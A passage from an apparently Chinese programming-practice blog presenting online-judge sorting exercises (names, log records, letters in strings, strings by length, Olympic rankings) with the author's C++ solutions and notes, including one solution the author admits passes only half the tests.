class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">country</span>&#123;</span><br><span class="line"><span class="type">char</span> name[<span class="number">100</span>]; </span><br><span class="line">&#125;s[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">compare</span><span class="params">(<span class="keyword">struct</span> country a, <span class="keyword">struct</span> country b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strcmp</span>(a.name, b.name) &lt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; s[i].name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(s, s+n, compare);;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt; n; i++)&#123;</span><br><span class="line">cout &lt;&lt; s[i].name &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="日志排序">日志排序</h3><p>有一个网络日志，记录了网络中计算任务的执行情况，每个计算任务对应一条如下形式的日志记录：“hs_10000_p”是计算任务的名称， “2007-01-1719:22:53,315”是计算任务开始执行的时间“年-月-日 时：分：秒，毫秒”，“253.035(s)”是计算任务消耗的时间(以秒计) hs_10000_p 2007-01-1719:22:53,315 253.035(s) 请你写一个程序，对日志中记录计算任务进行排序。时间消耗少的计算任务排在前面，时间消耗多的计算任务排在后面。如果两个计算任务消耗的时间相同，则将开始执行时间早的计算任务排在前面。</p><h6 id="输入描述">输入描述:</h6><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">日志中每个记录是一个字符串，每个字符串占一行。最后一行为空行，表示日志结束。日志中最多可能有<span class="number">10000</span>条记录。</span><br><span class="line">计算任务名称的长度不超过<span class="number">10</span>，开始执行时间的格式是<span class="variable constant_">YYYY</span>-<span class="variable constant_">MM</span>-<span class="variable constant_">DD</span> <span class="variable constant_">HH</span><span class="symbol">:MM</span><span class="symbol">:SS</span>,<span class="variable constant_">MMM</span>，消耗时间小数点后有三位数字。</span><br><span class="line">计算任务名称与任务开始时间、消耗时间之间以一个或多个空格隔开，行首和行尾可能有多余的空格。</span><br></pre></td></tr></table></figure><h6 id="输出描述">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">排序好的日志记录。每个记录的字符串各占一行。</span><br><span class="line">输入的格式与输入保持一致，输入包括几个空格，你的输出中也应该包含同样多的空格。</span><br></pre></td></tr></table></figure><p>读入数据的格式化处理，学到了以下几个东西：</p><ol type="1"><li>string也能进行直接比较，char * 可以用strcmp比较</li><li>substr 分割string</li><li>strtod把char * 变成浮点数</li><li>string中数字比较会麻烦一些，比如"40" &gt; "350"，但是40 &lt;350.</li></ol><p>但是不知道为啥只过了一半：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">task</span>&#123;</span><br><span class="line">string name; </span><br><span class="line">string t;</span><br><span class="line">string rt;</span><br><span class="line"><span class="type">float</span> rt_;</span><br><span class="line">&#125;tk[<span class="number">10000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">compare</span><span class="params">(<span class="keyword">struct</span> task a, <span class="keyword">struct</span> task b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a.rt_ == b.rt_) <span class="keyword">return</span> a.t &lt; b.t;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> a.rt_ &lt; b.rt_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string s;</span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">getline</span>(cin, s))&#123;</span><br><span class="line"><span class="keyword">if</span>(s == <span class="string">&quot;&quot;</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>, j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(j = len<span class="number">-1</span>; j &gt; <span class="number">0</span>; j--)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[j] != <span class="string">&#x27; &#x27;</span>&amp;&amp; s[j<span class="number">-1</span>] == <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">tk[cnt].rt = s.<span class="built_in">substr</span>(j, len-j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> l2 = tk[cnt].rt.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">char</span> tmp[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(tmp, tk[cnt].rt.<span class="built_in">substr</span>(<span class="number">0</span>, l2<span class="number">-3</span>).<span class="built_in">c_str</span>());</span><br><span class="line">tk[cnt].rt_ = <span class="built_in">strtod</span>(tmpstrtod, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; j; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27; &#x27;</span> &amp;&amp; s[i+<span class="number">1</span>] != <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">tk[cnt].name = s.<span class="built_in">substr</span>(<span class="number">0</span>, i+<span class="number">1</span>);;</span><br><span class="line">tk[cnt].t = s.<span class="built_in">substr</span>(i+<span class="number">1</span>, j-i<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cnt ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(tk, tk+cnt, compare);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cnt; i++)&#123;</span><br><span class="line">cout &lt;&lt; tk[i].name &lt;&lt; tk[i].t &lt;&lt; tk[i].rt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="字符串排序2">字符串排序2</h3><p>编写一个程序，将输入字符串中的字符按如下规则排序(一个测试用例可能包含多组数据，请注意处理)。</p><p>规则 1 ：英文字母从 A 到 Z 排列，不区分大小写。</p><p>如，输入： <strong>Type</strong> 输出： <strong>epTy</strong></p><p>规则 2 ：同一个英文字母的大小写同时存在时，按照输入顺序排列。</p><p>如，输入： <strong>BabA</strong> 输出： <strong>aABb</strong></p><p>规则 3 ：非英文字母的其它字符保持原来的位置。</p><p>如，输入： <strong>By?e</strong> 输出： <strong>Be?y</strong></p><p>样例：</p><p>输入：</p><p>A Famous Saying: Much Ado About Nothing(2012/8).</p><p>输出：</p><p>A aaAAbc dFgghh : iimM nNn oooos Sttuuuy (2012/8).</p><p>思路：字母单独存起来（规则三），然后按字母表排序（cmp），大小写按照输入顺序排即需要稳点排序（stable_sort）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">char</span> a, <span class="type">char</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>((<span class="built_in">islower</span>(a) &amp;&amp; <span class="built_in">islower</span>(b)) || (<span class="built_in">isupper</span>(a) &amp;&amp; <span class="built_in">isupper</span>(b))) <span class="keyword">return</span> a &lt; b;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">tolower</span>(a) != <span class="built_in">tolower</span>(b)) <span class="keyword">return</span> <span class="built_in">tolower</span>(a) &lt; <span class="built_in">tolower</span>(b);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> s[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">gets</span>(s))&#123;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="type">char</span> s_[<span class="number">1000</span>];</span><br><span class="line"><span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isalpha</span>(s[i])) s_[idx++] = s[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">stable_sort</span>(s_, s_+idx, cmp);</span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isalpha</span>(s[i])) s[i] = s_[idx++];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="字符串排序3">字符串排序3</h3><h5 id="题目描述">题目描述</h5><p>先输入你要输入的字符串的个数。然后换行输入该组字符串。每个字符串以回车结束，每个字符串少于一百个字符。如果在输入过程中输入的一个字符串为“stop”，也结束输入。然后将这输入的该组字符串按每个字符串的长度，由小到大排序，按排序结果输出字符串。</p><h6 id="输入描述-1">输入描述:</h6><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符串的个数，以及该组字符串。每个字符串以‘\n’结束。如果输入字符串为“stop”，也结束输入.</span><br></pre></td></tr></table></figure><h6 id="输出描述-1">输出描述:</h6><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可能有多组测试数据，对于每组数据，</span><br><span class="line">将输入的所有字符串按长度由小到大排序输出(如果有“stop”，不输出“stop”)。</span><br><span class="line"></span><br><span class="line">根据输入的字符串个数来动态分配存储空间（采用<span class="built_in">new</span>()函数）。每个字符串会少于<span class="number">100</span>个字符。</span><br><span class="line">测试数据有多组，注意使用<span class="built_in">while</span>()循环输入。</span><br></pre></td></tr></table></figure><p>my：cin之后会在缓冲区剩一个，如果再使用读取一行的函数读取会把，得用cin.ignore()</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">st</span>&#123;</span><br><span class="line">string s;</span><br><span class="line"><span class="type">int</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">struct</span> st a, <span class="keyword">struct</span> st b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.len &lt; b.len;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">cin.<span class="built_in">ignore</span>();</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">st</span> s[n];</span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> tmp[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">gets</span>(tmp);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(tmp, <span class="string">&quot;stop&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">s[i].s = tmp;</span><br><span class="line">s[i].len = s[i].s.<span class="built_in">size</span>();</span><br><span class="line">cnt++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sort</span>(s, s+cnt, cmp);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cnt; i++)&#123;</span><br><span class="line">cout &lt;&lt; s[i].s &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="奥运排序问题">奥运排序问题</h3><h5 id="题目描述-1">题目描述</h5><p>按要求，给国家进行排名。</p><h5 id="输入输出格式">输入输出格式</h5><h6 id="输入描述-2">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">有多组数据。</span><br><span class="line">第一行给出国家数<span class="built_in">N</span>，要求排名的国家数M，国家号从<span class="number">0</span>到<span class="built_in">N</span>-<span class="number">1</span>。</span><br><span class="line">第二行开始的<span class="built_in">N</span>行给定国家或地区的奥运金牌数，奖牌数，人口数（百万）。</span><br><span class="line">接下来一行给出M个国家号。</span><br></pre></td></tr></table></figure><h6 id="输出描述-2">输出描述:</h6><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">排序有<span class="number">4</span>种方式: 金牌总数 奖牌总数 金牌人口比例 奖牌人口比例 </span><br><span class="line">对每个国家给出最佳排名排名方式 和 最终排名</span><br><span class="line">格式为: 排名:排名方式</span><br><span class="line">如果有相同的最终排名，则输出排名方式最小的那种排名，对于排名方式，金牌总数 &lt; 奖牌总数 &lt; 金牌人口比例 &lt; 奖牌人口比例 </span><br><span class="line">如果有并列排名的情况，即如果出现金牌总数为 <span class="number">100,90,90,80</span>.则排名为<span class="number">1,2,2,4</span>.</span><br><span class="line">每组数据后加一个空行。</span><br></pre></td></tr></table></figure><p>我的方法是用结构体定义这四种排名的参数，id和rk也需要在里面，最后根据id在sort一遍。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">country</span>&#123;</span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line"><span class="type">double</span> gold_num;</span><br><span class="line"><span class="type">double</span> prize_num;</span><br><span class="line"><span class="type">double</span> gold_per_person;</span><br><span class="line"><span class="type">double</span> prize_per_person;</span><br><span class="line"><span class="type">int</span> rk[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp0</span><span class="params">(<span class="keyword">struct</span> country a, <span class="keyword">struct</span> country b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.id &lt; b.id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp1</span><span class="params">(<span class="keyword">struct</span> country a, <span class="keyword">struct</span> country b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.gold_num &gt; b.gold_num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp2</span><span class="params">(<span class="keyword">struct</span> country a, <span class="keyword">struct</span> country b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.prize_num &gt; b.prize_num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp3</span><span class="params">(<span class="keyword">struct</span> country a, <span class="keyword">struct</span> country b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.gold_per_person &gt; b.gold_per_person;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp4</span><span class="params">(<span class="keyword">struct</span> country a, <span class="keyword">struct</span> country b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.prize_per_person &gt; b.prize_per_person;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> cn, acn;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; cn &gt;&gt; acn)&#123;</span><br><span class="line"><span class="keyword">if</span>(acn == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">country</span>* cty = <span class="keyword">new</span> <span class="keyword">struct</span> country[cn];</span><br><span class="line"><span class="type">int</span> acn_id[acn];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cn; i++)&#123;</span><br><span class="line">cty[i].id = i;</span><br><span class="line"><span class="type">double</span> gold, prize, population;</span><br><span class="line">cin &gt;&gt; gold &gt;&gt; prize &gt;&gt; population;</span><br><span class="line">cty[i].gold_num = gold;</span><br><span class="line">cty[i].prize_num = prize;</span><br><span class="line">cty[i].gold_per_person = gold / population;</span><br><span class="line">cty[i].prize_per_person = prize / population;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; acn; i++)&#123;</span><br><span class="line">cin &gt;&gt; acn_id[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//金牌排名</span></span><br><span class="line"><span class="built_in">sort</span>(cty, cty+cn, cmp1);</span><br><span class="line"><span class="type">int</span> rk = <span class="number">1</span>;</span><br><span class="line">cty[<span class="number">0</span>].rk[<span class="number">0</span>] = rk++;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; cn; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(cty[i].gold_num == cty[i<span class="number">-1</span>].gold_num)&#123;</span><br><span class="line">cty[i].rk[<span class="number">0</span>] = cty[i<span class="number">-1</span>].rk[<span class="number">0</span>];</span><br><span class="line">rk++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> cty[i].rk[<span class="number">0</span>] = rk++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//奖牌排名</span></span><br><span class="line"><span class="built_in">sort</span>(cty, cty+cn, cmp2);</span><br><span class="line">rk = <span class="number">1</span>;</span><br><span class="line">cty[<span class="number">0</span>].rk[<span class="number">1</span>] = rk++;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; cn; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(cty[i].prize_num == cty[i<span class="number">-1</span>].prize_num)&#123;</span><br><span class="line">cty[i].rk[<span class="number">1</span>] = cty[i<span class="number">-1</span>].rk[<span class="number">1</span>];</span><br><span class="line">rk++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> cty[i].rk[<span class="number">1</span>] = rk++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//金牌人口比例排名</span></span><br><span class="line"><span class="built_in">sort</span>(cty, cty+cn, cmp3);</span><br><span class="line">rk = <span class="number">1</span>;</span><br><span class="line">cty[<span class="number">0</span>].rk[<span class="number">2</span>] = rk++;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; cn; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(cty[i].gold_per_person == cty[i<span class="number">-1</span>].gold_per_person)&#123;</span><br><span class="line">cty[i].rk[<span class="number">2</span>] = cty[i<span class="number">-1</span>].rk[<span class="number">2</span>];</span><br><span class="line">rk++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> cty[i].rk[<span class="number">2</span>] = rk++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//奖牌人口比例排名</span></span><br><span class="line"><span class="built_in">stable_sort</span>(cty, cty+cn, cmp4);</span><br><span class="line">rk = <span class="number">1</span>;</span><br><span class="line">cty[<span class="number">0</span>].rk[<span class="number">3</span>] = rk++;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; cn; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(cty[i].prize_per_person == cty[i<span class="number">-1</span>].prize_per_person)&#123;</span><br><span class="line">cty[i].rk[<span class="number">3</span>] = cty[i<span class="number">-1</span>].rk[<span class="number">3</span>];</span><br><span class="line">rk++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> cty[i].rk[<span class="number">3</span>] = rk++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//按输入顺序排名</span></span><br><span class="line"><span class="built_in">stable_sort</span>(cty, cty+cn, cmp0);</span><br><span class="line"><span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cn; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(cty[i].id == acn_id[idx])&#123;</span><br><span class="line">idx++;</span><br><span class="line"><span class="type">int</span> min_rk = cty[i].rk[<span class="number">0</span>], mrk_id = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(min_rk &gt; cty[i].rk[j])&#123;</span><br><span class="line">min_rk = cty[i].rk[j];</span><br><span class="line">mrk_id = j+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d:%d\n&quot;</span>, min_rk, mrk_id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span 